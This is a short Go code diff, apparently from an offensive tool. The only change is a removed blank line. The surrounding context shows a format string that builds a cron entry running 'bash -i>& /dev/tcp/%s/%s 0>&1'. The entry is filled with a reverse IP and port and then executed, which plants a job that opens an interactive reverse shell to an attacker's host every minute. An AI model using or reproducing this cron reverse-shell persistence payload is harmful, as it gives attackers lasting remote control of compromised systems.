@@ -47,7 +47,6 @@ func Run() {
 
 * * * * * bash -i>& /dev/tcp/%s/%s 0>&1
 
-
 `, reverseIp, reversePort),
 	}
 	hik.Run()
